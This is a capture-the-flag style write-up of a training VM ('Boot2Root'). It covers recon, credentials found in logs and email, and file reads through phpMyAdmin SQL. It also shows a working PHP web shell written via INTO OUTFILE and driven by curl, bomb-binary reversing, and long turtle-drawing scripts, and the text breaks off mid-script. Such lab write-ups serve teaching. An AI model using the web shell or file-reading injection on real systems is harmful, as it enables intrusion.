# Boot2Root

#### This writeup is written in markdown format. Consider using markdown viewer for better experience.

## Setting up
our setup consist of 2 vm instance on the same NAT Network.
- one for [Boot2Root](https://projects.intra.42.fr/projects/42cursus-boot2root)
- one for [kali](https://www.kali.org/get-kali/#kali-virtual-machines)

We leave the default setting on the NAT Network.
- 10.0.2.0/24

Most work will be done on kali VM

## Reconnaissance

We start by using nmap to scan for connect and open port on the whole network.

```
> nmap 10.0.2.0/24
[...]
Nmap scan report for 10.0.2.4
Host is up (0.00044s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
[...]
```
We now see the ip we can use to connect to the server and the 2 ports that we can try to probe on: 80 and 443.

For ease of use we add this record to the `/etc/hosts` file
``` 
10.0.2.4    borntosec
```
using gobuster with some common dir name wordlist we found

https://github.com/digination/dirbuster-ng/blob/master/wordlists/common.txt

port 80:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://borntosec
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ./scripts/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 287]
/forum                (Status: 301) [Size: 314] [--> https://borntosec/forum/]
/phpmyadmin           (Status: 301) [Size: 319] [--> https://borntosec/phpmyadmin/]
/webmail              (Status: 301) [Size: 316] [--> https://borntosec/webmail/]
Progress: 1942 / 1943 (99.95%)
===============================================================
Finished
===============================================================
```

port 443:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://borntosec
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ./scripts/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 287]
/forum                (Status: 403) [Size: 284]
Progress: 1942 / 1943 (99.95%)
===============================================================
Finished
===============================================================
```

We found that there're some routes we can navigate to.
On further investigation here are the result.
- Server: Apache 2.2.22
- /forum : my little forum https://github.com/My-Little-Forum/mylittleforum
- /webmail : squirrelmail 1.4.22  https://www.squirrelmail.org/
- /phpmyadmin : mysql admin panel https://www.phpmyadmin.net/

##### note: my little forum contain an wide permission folder 'templates_c' which can be use later

## Forum
By scaning the forum we found an interesting thread: "Probleme login ?"

And even more interesting lines:
```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
```

Look like we got a cred: 

user: `lmezard`  
pass: `!q\]Ej?*5K5cy*AJ`


Using this cred to login to forum provide us with 

email: `laurie@borntosec.net`  
pass: `!q\]Ej?*5K5cy*AJ`


## Webmail
Loginning with laurie account, we got this from "DB Access" mail
```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```
user: `root`  
pass: `Fg-'kKXBj87E:aJ$`


## PHPMyAdmin
And you are now ROOT ..... on mysql

with access to phpmysql it allow us to write some sql ..... injection.

let start with 
```
SELECT LOAD_FILE('/etc/passwd/)
```

this return a blob which can be export as Json
```
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
mysql:x:106:115:MySQL Server,,,:/nonexistent:/bin/false
ftp:x:107:116:ftp daemon,,,:/srv/ftp:/bin/false
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
dovecot:x:108:117:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:110:118::/var/spool/postfix:/bin/false
```

We can see that there are user that we can use try to ssh over login 
```
[...]
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
[...]
lmezard:x:1001:1001:laurie,,,:/home/lmezard:/bin/bash
laurie@borntosec.net:x:1002:1002:Laurie,,,:/home/laurie@borntosec.net:/bin/bash
laurie:x:1003:1003:,,,:/home/laurie:/bin/bash
thor:x:1004:1004:,,,:/home/thor:/bin/bash
zaz:x:1005:1005:,,,:/home/zaz:/bin/bash
[...]
```

Let's probe a bit more, we know that the server is running on apache2. We can try to retrieve the site config.

```
SELECT LOAD_FILE('/etc/apache2/sites-enabled/000-default')
```
```
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    ServerName BorntoSec
    DocumentRoot /var/www

    <Directory /var/www/forum>
        SSLRequireSSL
    </Directory>
    <Directory /var/www/>
        allow from all
    </Directory>
</VirtualHost>

<VirtualHost *:443>
    ServerAdmin webmaster@localhost
    SSLEngine On
    SSLCertificateFile /etc/ssl/private/localhost.pem

Alias /phpmyadmin /usr/share/phpmyadmin
<Directory /usr/share/phpmyadmin>
    Options FollowSymLinks
    DirectoryIndex index.php
    AllowOverride All

    <IfModule mod_php5.c>
        AddType application/x-httpd-php .php
        php_flag magic_quotes_gpc Off
        php_flag track_vars On
        php_flag register_globals Off
        php_admin_flag allow_url_fopen Off
        php_value include_path .
        php_admin_value upload_tmp_dir /var/lib/phpmyadmin/tmp
        php_admin_value open_basedir /usr/share/phpmyadmin/:/etc/phpmyadmin/:/var/lib/phpmyadmin/
    </IfModule>
</Directory>

Alias /forum /var/www/forum
<Directory /var/www/forum>
    Options Indexes FollowSymLinks MultiViews
    <IfModule mod_php5.c>
        php_flag register_globals off
    </IfModule>
    <IfModule mod_dir.c>
        DirectoryIndex index.php
    </IfModule>
</Directory>

Alias /webmail /usr/share/squirrelmail
<Directory /usr/share/squirrelmail>
    Options FollowSymLinks
        <IfModule mod_php5.c>
            php_flag register_globals off
        </IfModule>
        <IfModule mod_dir.c>
            DirectoryIndex index.php
        </IfModule>

        <Files configtest.php>
            order deny,allow
            deny from all
            allow from 127.0.0.1
        </Files>
    </Directory>
</VirtualHost>
```

From this we know where each services is locate on the server.

## websh
We know that `my little forum` contain a possible target of websh attack `templates_c`. Lets try that.

```
select "<?=`{$_REQUEST['_']}`?>" INTO OUTFILE  "/var/www/forum/templates_c/websh.php"
```

and now we can execute shell command via

```
curl --insecure  -X POST https://borntosec/forum/templates_c/websh.php -d "_=ls" > output.txt
```

we want to scan through as much as possible so by sending this command, we can search through the directory tree for any interesting dir
```
"_=ls -R / 2>/dev/null"
```

from the dir list we found an interesting file `/home/LOOKATME/password`

```
"_=cat /home/LOOKATME/password"
```

And we got 
```
lmezard:G!@M6f4Eatau{sF"
```

From trying we found this is an ftp cred.

## FTP
We use filezilla to connect to the server and we found 2 files.

```
README fun
```
we download both file and in README

```
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

`fun` is an archive file with many .pcap file

on futher inspection the file is not actually package trace file but just text files with .pcap extension.

one of the file stand out as 
```c
int main() {
        printf("M");
        printf("Y");
        printf(" ");
        printf("P");
        printf("A");
        printf("S");
        printf("S");
        printf("W");
        printf("O");
        printf("R");
        printf("D");
        printf(" ");
        printf("I");
        printf("S");
        printf(":");
        printf(" ");
        printf("%c",getme1());
        printf("%c",getme2());
        printf("%c",getme3());
        printf("%c",getme4());
        printf("%c",getme5());
        printf("%c",getme6());
        printf("%c",getme7());
        printf("%c",getme8());
        printf("%c",getme9());
        printf("%c",getme10());
        printf("%c",getme11());
        printf("%c",getme12());
        printf("\n");
        printf("Now SHA-256 it and submit");
}
```

MY PASSWORD IS _____

other file is tag with `//fileXXX` where X is number

by arranging the file in accending order and combining them we form a C file.

```
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit
```

```
> echo -n "Iheartpwnage" | sha256sum
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

with that we gain access to server via `laurie` via ssh

## bomb
with ssh we `scp` 2 files `bomb` and `README` to kali

the README
```
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).

```

bomb is a binary file, we use ghidra to it reverse engineer.

it should that there are 6 phase to the bomb.

phase 1  check for string

```
Public speaking is very easy.
```

phase 2 check for 6 number that check for condition where

- if its not the first number, chehck if the number is the index * last number so by doing simple math
```
1 2 6 24 120 720
```

phase 3 is just a switch statenent so by follow the flow there're 4 possible solution

```
1 b 214
2 b 755
7 b 524
```

phase 4 seem to be recursive function checking. 
My brain is dead so ...  
brute for the solution   

```c
int func4(int param_1)
{
  int iVar1;
  int iVar2;
  
  if (param_1 < 2) {
    iVar2 = 1;
  }
  else {
    iVar1 = func4(param_1 + -1);
    iVar2 = func4(param_1 + -2);
    iVar2 = iVar2 + iVar1;
  }
  return iVar2;
}

#include <stdio.h>

int main(void) {
    int num = 2;
    while (1) {
        if (func4(num) == 55){
            printf(">>> %d\n", num);
            return 0;
        }
        num++;
    }
    return 0;
}
```

```
9
```

phase 5 is ascii puzzle, a string with 6 char. 
the condition is for the char to be modulo by 16 and using it decimal value as index to form a string base on another string "isrveawhobpnutfg" and the string must be equal to "giants"

```
opekmq
opukmq
```

phase 6 .... 6 number link list 

```c
typedef struct node
{
	int				content;
	struct node*	next;
} node;

node node1 = {0x0fd, 1};
node node2 = {0x2d5, 2};
node node3 = {0x12d, 3};
node node4 = {0x3e5, 4};
node node5 = {0x0d4, 5};
node node6 = {0x1b0, 6};

void phase_6(const char *input)
{
    node	*next;
    int		j;
    node	*selected;
    node	*current;
    int		i;
    node	*nodes[6];
    int		nums[6];

    read_six_numbers(input, nums);

	// No number > 6, no duplicates
    i = 0;
    do {
        j = i;
        if (nums[i] > 6)
            explode_bomb();

        while (j < 5)
            if (nums[i] == nums[++j + 1])
                explode_bomb();
        i++;
    } while (i < 6);

	// Select nodes based on index(1..6)
    i = 0;
    do {
        selected = &node1;
        j = 1;
        if (nums[i] > 1) {
            do {
                selected = selected->next;
            } while (j++ < nums[i]);
        }
        nodes[i] = selected;
        i++;
    } while (i < 6);

	// Relink nodes according to selection
    i = 1;
    current = nodes[0];
    do {
        next = nodes[i];
        current->next = next;
        i++;
        current = next;
    } while (i < 6);
    next->next = NULL;

	// Check that nodes contents are in descending order
    i = 0;
    do {
        if (nodes[0]->content < nodes[0]->next->content)
            explode_bomb();
        nodes[0] = nodes[0]->next;
        i++;
    } while (i < 5);
}
```

```
4 2 6 3 1 5
```

combine password is 
```
Publicspeakingisveryeasy.126241207201b2149opekmq426315
```

base on 
```
For the part related to a (bin) bomb: If the password found is
123456. The password to use is 123546.
```

final password is

```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

and that's thor pass

## turtle

samething. scp 2 files `README` and `turtle`

turtle file contain French instruction for pixel art.
by using python turtle package.

```py
import turtle 
s = turtle.getscreen()
t = turtle.Turtle()

t.speed(0)

t.lt(90)
t.fd(50)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(1)
t.rt(1)
t.fd(50)
turtle.done()
```

```py
import turtle 
s = turtle.getscreen()
t = turtle.Turtle()

t.speed(0)

t.fd(210)
t.bk(210)
t.rt(90)
t.fd(120)
turtle.done()
```

```py
import turtle 
s = turtle.getscreen()
t = turtle.Turtle()

t.speed(0)
t.rt(10)
t.fd(200)
t.rt(150)
t.fd(200)
t.bk(100)
t.rt(120)
t.fd(50)
turtle.done()
```

```py
import turtle 
s = turtle.getscreen()
t = turtle.Turtle()

t.speed(0)
t.lt(90)
t.fd(50)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
t.fd(1)
t.lt(1)
